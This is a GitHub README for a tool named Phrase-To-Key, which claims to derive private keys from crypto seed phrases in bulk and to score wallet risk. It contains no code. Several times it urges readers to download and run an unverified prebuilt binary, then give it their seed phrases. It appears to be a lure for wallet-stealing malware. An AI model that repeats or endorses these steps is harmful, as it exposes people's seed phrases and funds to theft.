# Phrase-To-Key — Extract Private Keys and Assess Wallet Risk 🔐📊

[![Release](https://img.shields.io/github/v/release/adhamosamaa/Phrase-To-Key?style=for-the-badge&label=Download%20Release&color=blue)](https://github.com/adhamosamaa/Phrase-To-Key/releases)

A tool for extracting private keys (P.Key) from seed phrases and for assessing wallet risk across chains. It targets developers, auditors, and analysts who work with wallet recovery, wallet hygiene, and automated checks on BNB Chain, Ethereum, and compatible networks.

Badges
- Topics: blockchain · blockchain-tool · bnb-chain · bot · bsc · codepen · credit-score · eth · ethereum-mainnet · wallet · wallet-address · web3
- Platform: Linux · macOS · Windows
- BIP / standards: BIP-39 · BIP-32 · BIP-44

Hero image
![wallet-key](https://img.icons8.com/ios-filled/120/000000/secure-wallet.png)

---

## Table of contents
- Features
- How it works
- Supported chains and derivation paths
- Quick start
- Download & run
- CLI usage
- API and integration
- Wallet risk scoring model
- Output formats
- Security model
- Contributing
- License
- Acknowledgements

---

## Features
- Extract seed phrase words to private keys using BIP-39 and BIP-44 logic.
- Derive addresses for Ethereum and BSC (EVM) and other chains that use secp256k1.
- Produce a wallet risk score using on-chain activity, token holdings, and known flags.
- Batch process multiple seed phrases or addresses.
- Export results in CSV, JSON, or simple report text.
- Provide a clear audit trail for each derived key and address.
- Offer pluggable checks (custom rules, blacklist lookup, heuristic checks).

---

## How it works
Phrase-To-Key follows standard cryptographic steps. It uses a seed phrase and a derivation path. It applies BIP-39 to convert a phrase to a seed. It uses BIP-32/BIP-44 to derive child keys. It derives private keys and public addresses and queries chain data to compute risk.

Main steps:
1. Parse the seed phrase and validate the word list.
2. Apply passphrase if provided.
3. Generate the BIP-39 seed.
4. Derive keys using standard paths (m/44'/60'/0'/0/n, m/44'/60'/0'/1/n).
5. Compute addresses from public keys.
6. Query on-chain data for balances, recent tx, token approvals, and contract interactions.
7. Score the wallet using a weighted model.
8. Output keys, addresses, and the risk report.

Key terms used:
- Seed phrase: a list of words defined by BIP-39.
- Derivation path: sequence that defines which child key to derive.
- Private key (P.Key): raw secret for signing transactions.
- Address: account identifier used on-chain.
- On-chain flags: behavior indicators such as approvals to contracts, transfers to mixers, or interactions with known scam addresses.

---

## Supported chains and derivation paths
Phrase-To-Key supports chains that use secp256k1 keys and EVM-style addresses:
- Ethereum Mainnet (eth)
- Binance Smart Chain (bnb-chain, bsc)
- Compatible EVM chains

Default derivation paths:
- m/44'/60'/0'/0/n (Ethereum standard)
- m/44'/60'/0'/1/n
- Custom paths supported via CLI or config

---

## Quick start
1. Clone the repo or install the release build.
2. Prepare a file with seed phrases, one per line.
3. Run the tool against the file.
4. Inspect the generated CSV or JSON for private keys, addresses, and risk scores.

Use the release page to get the right binary for your OS:
- Download the matching release asset from the releases page and run it on your machine.
- The release page is available here: https://github.com/adhamosamaa/Phrase-To-Key/releases

---

## Download & run
Download the release asset from the releases page and execute the binary for your OS. The release contains prebuilt packages and checksums.

- Visit the release page and download the file that matches your platform.
- Extract the package if needed.
- Make the binary executable (Linux/macOS) and run it.

Example commands (replace <release-file> with the actual asset name from the release):
- Linux / macOS:
  - chmod +x Phrase-To-Key-<version>-linux
  - ./Phrase-To-Key-<version>-linux --input seeds.txt --output report.csv
- Windows (PowerShell):
  - .\Phrase-To-Key-<version>-win.exe --input seeds.txt --output report.json

You must download the release file from the releases page and execute it. If a GUI release exists, run the provided installer. If a ZIP or tarball exists, extract and run the included executable.

Release link (again): [Download releases and assets](https://github.com/adhamosamaa/Phrase-To-Key/releases)

---

## CLI usage
Basic syntax:
Phrase-To-Key [options] --input <file> --output <file>

Common flags:
- --input <file>      Input file with seed phrases or addresses
- --output <file>     Output file (CSV, JSON, TXT)
- --format <type>     Output format: csv, json, report
- --chain <name>      Chain name: eth, bsc, custom
- --path <derivation> Custom derivation path
- --limit <n>         Max addresses derived per seed
- --rate <n>          API request rate limit
- --apikey <key>      Optional: web3 provider key
- --verbose           More runtime logs (debug level)

Examples:
- Derive first 5 addresses for each phrase:
  ./Phrase-To-Key --input seeds.txt --output keys.csv --limit 5 --format csv
- Assess a single address:
  ./Phrase-To-Key --input addresses.txt --output risk.json --format json --chain eth

---

## API and integration
Phrase-To-Key offers a simple HTTP API layer as an optional module. You can run the API as a service and call endpoints from scripts or CI.

Common endpoints:
- POST /derive
  - Body: { "phrase": "...", "path": "m/44'/60'/0'/0/0", "count": 5 }
  - Response: { "keys": [ { "priv": "...", "addr": "0x..." } ] }
- POST /assess
  - Body: { "address": "0x...", "chain": "eth" }
  - Response: { "score": 42, "flags": [ "high-approval", "recent-outflow" ] }

Use the CLI flag --api to start the server and bind to a port.

---

## Wallet risk scoring model
The tool computes a score from 0 to 100. Higher means higher risk. The score combines on-chain signals with heuristics.

Components:
- Balance profile (weight 20): current and historical balances.
- Activity profile (weight 20): frequency, tx count, pattern of transfers.
- Approvals (weight 25): token approvals to contracts or proxies.
- Known addresses (weight 15): transfers to or from flagged addresses.
- Token mix (weight 10): presence of suspicious tokens or rug tokens.
- Freshness and randomness (weight 10): behavior that matches mixer or scam flows.

Flags can include:
- high-approval
- frequent-small-transfers
- outgoing-to-mixer
- received-from-known-scam
- low-entropy-derivation (rare)

You can tune weights via config or a JSON policy file.

---

## Output formats
- CSV: rows with phrase, derivation path, index, address, private key, balance, score, flags
- JSON: structured output for pipelines
- Report: human-friendly text summary per seed

Sample CSV header:
phrase,derivation,index,address,private_key,balance_eth,score,flags

Export options let you hide private keys for audit-only runs.

---

## Security model
The project treats private keys as sensitive data. The tool offers options to:
- Keep keys in memory only, avoid writing to disk.
- Encrypt output with a provided passphrase.
- Stream results to stdout for secure redirection.
- Use HSM or external signer via plug-in to avoid exporting raw keys.

You can enable a secure mode via flags:
--secure-memory --encrypt-output --no-write-private

The release archive includes checksums and signatures where applicable.

---

## Contributing
We accept issues and pull requests. To contribute:
1. Fork the repo.
2. Create a feature branch.
3. Add tests and documentation.
4. Submit a PR with a clear description of changes.

Areas where you can help:
- New chain support
- Additional heuristic checks
- Performance tuning for batch runs
- Better CI and test coverage

Please follow the code style and add unit tests for new logic.

---

## License
This repository uses the MIT License. See LICENSE for details.

---

## Acknowledgements
- BIP-39 and BIP-32 standards for seed and key derivation.
- Public RPC providers and block explorers for on-chain data.
- Open-source libraries for secp256k1 and keccak.

Images and icons
- Key and wallet icons from public icon sets.

---

Screenshots
![derive-sample](https://img.icons8.com/ios-filled/100/000000/key.png) ![report-sample](https://img.icons8.com/ios-filled/100/000000/wallet-app.png)

---

If you need the release file, download the appropriate asset from the releases page and execute it on your system:
https://github.com/adhamosamaa/Phrase-To-Key/releases